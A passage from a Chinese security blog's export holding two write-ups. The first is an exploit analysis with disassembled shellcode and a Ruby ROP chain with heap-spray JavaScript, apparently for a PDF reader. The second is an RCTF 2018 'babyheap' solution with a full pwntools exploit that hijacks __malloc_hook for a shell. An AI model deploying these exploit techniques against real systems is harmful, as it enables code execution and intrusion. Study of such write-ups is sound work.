edi,eax029e0045 e2f2 loop 029e0039029e0047 52 push edx029e0048 57 push edi029e0049 8b5210 mov edx,dword ptr [edx+10h]029e004c 8b4a3c mov ecx,dword ptr [edx+3Ch]029e004f 8b4c1178 mov ecx,dword ptr [ecx+edx+78h]029e0053 e348 jecxz 029e009d029e0055 01d1 add ecx,edx029e0057 51 push ecx029e0058 8b5920 mov ebx,dword ptr [ecx+20h]029e005b 01d3 add ebx,edx029e005d 8b4918 mov ecx,dword ptr [ecx+18h]029e0060 e33a jecxz 029e009c029e0062 49 dec ecx029e0063 8b348b mov esi,dword ptr [ebx+ecx*4]029e0066 01d6 add esi,edx029e0068 31ff xor edi,edi029e006a ac lods byte ptr [esi]029e006b c1cf0d ror edi,0Dh029e006e 01c7 add edi,eax029e0070 38e0 cmp al,ah029e0072 75f6 jne 029e006a029e0074 037df8 add edi,dword ptr [ebp-8]029e0077 3b7d24 cmp edi,dword ptr [ebp+24h]029e007a 75e4 jne 029e0060029e007c 58 pop eax029e007d 8b5824 mov ebx,dword ptr [eax+24h]029e0080 01d3 add ebx,edx029e0082 668b0c4b mov cx,word ptr [ebx+ecx*2]029e0086 8b581c mov ebx,dword ptr [eax+1Ch]029e0089 01d3 add ebx,edx029e008b 8b048b mov eax,dword ptr [ebx+ecx*4]029e008e 01d0 add eax,edx029e0090 89442424 mov dword ptr [esp+24h],eax029e0094 5b pop ebx029e0095 5b pop ebx029e0096 61 popad029e0097 59 pop ecx029e0098 5a pop edx029e0099 51 push ecx029e009a ffe0 jmp eax029e009c 5f pop edi029e009d 5f pop edi029e009e 5a pop edx029e009f 8b12 mov edx,dword ptr [edx]029e00a1 eb8d jmp 029e0030029e00a3 5d pop ebp029e00a4 6a01 push 1029e00a6 8d85b2000000 lea eax,[ebp+0B2h]029e00ac 50 push eax029e00ad 68318b6f87 push 876F8B31h029e00b2 ffd5 call ebp029e00b4 bbf0b5a256 mov ebx,56A2B5F0h029e00b9 68a695bd9d push 9DBD95A6h029e00be ffd5 call ebp029e00c0 3c06 cmp al,6029e00c2 7c0a jl 029e00ce029e00c4 80fbe0 cmp bl,0E0h029e00c7 7505 jne 029e00ce029e00c9 bb4713726f mov ebx,6F721347h029e00ce 6a00 push 0029e00d0 53 push ebx029e00d1 ffd5 call ebp029e00d3 63616c arpl word ptr [ecx+6Ch],sp029e00d6 632e arpl word ptr [esi],bp029e00d8 657865 js 029e0140029e00db 000c0c add byte ptr [esp+ecx],cl 一个被变形过的 shellcode,很难看出来功能，在kernel32!WinExec处下断点可以发现功能是弹出计算器。可能是我太菜了，算了，就这样吧。 exploit分析先贴一下主要的代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203 def make_js(encoded_payload) # The following executes a ret2lib using icucnv36.dll # The effect is to bypass DEP and execute the shellcode in an indirect way stack_data = [ 0x41414141, # unused 0x4a8063a5, # pop ecx / ret 0x4a8a0000, # becomes ecx 0x4a802196, # mov [ecx],eax / ret # save whatever eax starts as 0x4a801f90, # pop eax / ret 0x4a84903c, # becomes eax (import for CreateFileA) # -- call CreateFileA 0x4a80b692, # jmp [eax] 0x4a801064, # ret 0x4a8522c8, # first arg to CreateFileA (lpFileName / pointer to "iso88591") 0x10000000, # second arg - dwDesiredAccess 0x00000000, # third arg - dwShareMode 0x00000000, # fourth arg - lpSecurityAttributes 0x00000002, # fifth arg - dwCreationDisposition 0x00000102, # sixth arg - dwFlagsAndAttributes 0x00000000, # seventh arg - hTemplateFile 0x4a8063a5, # pop ecx / ret 0x4a801064, # becomes ecx 0x4a842db2, # xchg eax,edi / ret 0x4a802ab1, # pop ebx / ret 0x00000008, # becomes ebx - offset to modify # # This points at a neat-o block of code that ... TBD # # and [esp+ebx*2],edi # jne check_slash # ret_one: # mov al,1 # ret # check_slash: # cmp al,0x2f # je ret_one # cmp al,0x41 # jl check_lower # cmp al,0x5a # jle check_ptr # check_lower: # cmp al,0x61 # jl ret_zero # cmp al,0x7a # jg ret_zero # cmp [ecx+1],0x3a # je ret_one # ret_zero: # xor al,al # ret # 0x4a80a8a6, # execute fun block 0x4a801f90, # pop eax / ret 0x4a849038, # becomes eax (import for CreateFileMappingA) # -- call CreateFileMappingA 0x4a80b692, # jmp [eax] 0x4a801064, # ret 0xffffffff, # arguments to CreateFileMappingA, hFile 0x00000000, # lpAttributes 0x00000040, # flProtect 0x00000000, # dwMaximumSizeHigh 0x00010000, # dwMaximumSizeLow 0x00000000, # lpName 0x4a8063a5, # pop ecx / ret 0x4a801064, # becomes ecx 0x4a842db2, # xchg eax,edi / ret 0x4a802ab1, # pop ebx / ret 0x00000008, # becomes ebx - offset to modify 0x4a80a8a6, # execute fun block 0x4a801f90, # pop eax / ret 0x4a849030, # becomes eax (import for MapViewOfFile # -- call MapViewOfFile 0x4a80b692, # jmp [eax] 0x4a801064, # ret 0xffffffff, # args to MapViewOfFile - hFileMappingObject 0x00000022, # dwDesiredAccess 0x00000000, # dwFileOffsetHigh 0x00000000, # dwFileOffsetLow 0x00010000, # dwNumberOfBytesToMap 0x4a8063a5, # pop ecx / ret 0x4a8a0004, # becomes ecx - writable pointer 0x4a802196, # mov [ecx],eax / ret - save map base addr 0x4a8063a5, # pop ecx / ret 0x4a801064, # becomes ecx - ptr to ret 0x4a842db2, # xchg eax,edi / ret 0x4a802ab1, # pop ebx / ret 0x00000030, # becomes ebx - offset to modify 0x4a80a8a6, # execute fun block 0x4a801f90, # pop eax / ret 0x4a8a0004, # becomes eax - saved file mapping ptr 0x4a80a7d8, # mov eax,[eax] / ret - load saved mapping ptr 0x4a8063a5, # pop ecx / ret 0x4a801064, # becomes ecx - ptr to ret 0x4a842db2, # xchg eax,edi / ret 0x4a802ab1, # pop ebx / ret 0x00000020, # becomes ebx - offset to modify 0x4a80a8a6, # execute fun block 0x4a8063a5, # pop ecx / ret 0x4a801064, # becomes ecx - ptr to ret 0x4a80aedc, # lea edx,[esp+0xc] / push edx / push eax / push [esp+0xc] / push [0x4a8a093c] / call ecx / add esp, 0x10 / ret 0x4a801f90, # pop eax / ret 0x00000034, # becomes eax 0x4a80d585, # add eax,edx / ret 0x4a8063a5, # pop ecx / ret 0x4a801064, # becomes ecx - ptr to ret 0x4a842db2, # xchg eax,edi / ret 0x4a802ab1, # pop ebx / ret 0x0000000a, # becomes ebx - offset to modify 0x4a80a8a6, # execute fun block 0x4a801f90, # pop eax / ret 0x4a849170, # becomes eax (import for memcpy) # -- call memcpy 0x4a80b692, # jmp [eax] 0xffffffff, # this stuff gets overwritten by the block at 0x4a80aedc, becomes ret from memcpy 0xffffffff, # becomes first arg to memcpy (dst) 0xffffffff, # becomes second arg to memcpy (src) 0x00001000, # becomes third arg to memcpy (length) #0x0000258b, # ?? #0x4d4d4a8a, # ?? ].pack('V*') var_unescape = rand_text_alpha(rand(100) + 1) var_shellcode = rand_text_alpha(rand(100) + 1) var_start = rand_text_alpha(rand(100) + 1) var_s = 0x10000 var_c = rand_text_alpha(rand(100) + 1) var_b = rand_text_alpha(rand(100) + 1) var_d = rand_text_alpha(rand(100) + 1) var_3 = rand_text_alpha(rand(100) + 1) var_i = rand_text_alpha(rand(100) + 1) var_4 = rand_text_alpha(rand(100) + 1) payload_buf = '' payload_buf &lt;&lt; stack_data payload_buf &lt;&lt; encoded_payload escaped_payload = Rex::Text.to_unescape(payload_buf) js = %Q|var #&#123;var_unescape&#125; = unescape;var #&#123;var_shellcode&#125; = #&#123;var_unescape&#125;( '#&#123;escaped_payload&#125;' );var #&#123;var_c&#125; = #&#123;var_unescape&#125;( "%" + "u" + "0" + "c" + "0" + "c" + "%u" + "0" + "c" + "0" + "c" );while (#&#123;var_c&#125;.length + 20 + 8 &lt; #&#123;var_s&#125;) #&#123;var_c&#125;+=#&#123;var_c&#125;;#&#123;var_b&#125; = #&#123;var_c&#125;.substring(0, (0x0c0c-0x24)/2);#&#123;var_b&#125; += #&#123;var_shellcode&#125;;#&#123;var_b&#125; += #&#123;var_c&#125;;#&#123;var_d&#125; = #&#123;var_b&#125;.substring(0, #&#123;var_s&#125;/2);while(#&#123;var_d&#125;.length &lt; 0x80000) #&#123;var_d&#125; += #&#123;var_d&#125;;#&#123;var_3&#125; = #&#123;var_d&#125;.substring(0, 0x80000 - (0x1020-0x08) / 2);var #&#123;var_4&#125; = new Array();for (#&#123;var_i&#125;=0;#&#123;var_i&#125;&lt;0x1f0;#&#123;var_i&#125;++) #&#123;var_4&#125;[#&#123;var_i&#125;]=#&#123;var_3&#125;+"s";| js end 就是和上一步的调试的结果差不多，就是布置 shellcode，堆喷射之类的，and [esp+ebx*2],edi 感觉这个指令用的好6。大概就是这些了。]]></content>
      <tags>
        <tag>old_blog</tag>
        <tag>vuln</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[rctf 2018 babyheap]]></title>
    <url>%2F2019%2F01%2F09%2Frctf-2018%2F</url>
    <content type="text"><![CDATA[从备份失败的老博客还原出来的 分析函数在读入数据的时候存在 null off by one123456789101112v5 = __readfsqword(0x28u);for ( i = 0; i &lt; a2; ++i )&#123; buf = 0; if ( read(0, &amp;buf, 1uLL) &lt; 0 ) fprintf_error((__int64)"read() error"); *(_BYTE *)(a1 + i) = buf; if ( buf == 10 ) break;&#125;*(_BYTE *)(i + a1) = 0;return __readfsqword(0x28u) ^ v5; 利用方法如下图构造堆，free 堆 1 和 3, 之后重新分配 3 ,并且使 chunk 4的 prev size 位为前三个chunk 的大小的和， null off by one 使覆盖chunk 4的inuse位，造成chunkoverlapping,泄漏libc基址，之后使用 fastbin double free使得 malloc_hook被赋值为 one_gadget的地址，发现做完后最坑的是四个 gadget没有一个符合上下文，懵逼，最后师傅告诉我可以通过瞎 free,然后导致abort,最后getshell123456789+-----------+| 1 | small bin 128+-----------+| 2 | fastbin 96+-----------+| 3 | fastbin 96+-----------+| 4 | smallbin 240+-----------+ 下面是利用程序123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import *context.log_level = 'debug'def alloc(p, size, content): p.recvuntil("choice: ") p.sendline("1") p.recvuntil("size: ") p.sendline(size) p.recvuntil("content: ") p.sendline(content)def show(p, index): p.recvuntil("choice: ") p.sendline("2") p.recvuntil("index: ") p.sendline(index) return p.recv() def delete(p, index): p.recvuntil("choice: ") p.sendline("3") p.recvuntil("index: ") p.sendline(index)def exploit(p): alloc(p, '128', 'A') #0 alloc(p, '96', 'A') #1 alloc(p, '96', 'B') #2 alloc(p, '240', 'C') #3 alloc(p, '32', 'C') #4 delete(p, '0') #-0 delete(p, '2') #-2 payload = 'A'*0x60 + p64(0x170) alloc(p, '104', payload) #0 delete(p, '3') #-3 alloc(p, '128', 'A'*0x80) #2 data = show(p, '1') unsort_bin_addr = u64(data.split(": ")[1][:6].ljust(8,'\x00')) top_chunk = unsort_bin_addr libc_base = unsort_bin_addr - 0x3c4b78 malloc_hook = libc_base + 0x3c4b10 log.info("top chunk addr 0x%0x", top_chunk) one_gadget = libc_base + 0xf02a4 p.sendline("3") p.recvuntil("index: ") p.sendline("0") payload = 'A'*0x60 + p64(0) + p64(0x71) +p64(malloc_hook - 0x13) alloc(p, '128', payload) alloc(p, '96', 'A') #pause() alloc(p, '96', "A"*3 + p64(one_gadget)) delete(p, '1') p.interactive() if __name__ == '__main__': if len(sys.argv) &gt; 1: p = remote("babyheap.2018.teamrois.cn", 3154) else: p = process('./babyheap') exploit(p)]]></content>
      <tags>
        <tag>old_blog</tag>
        <tag>ctf</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
</search>
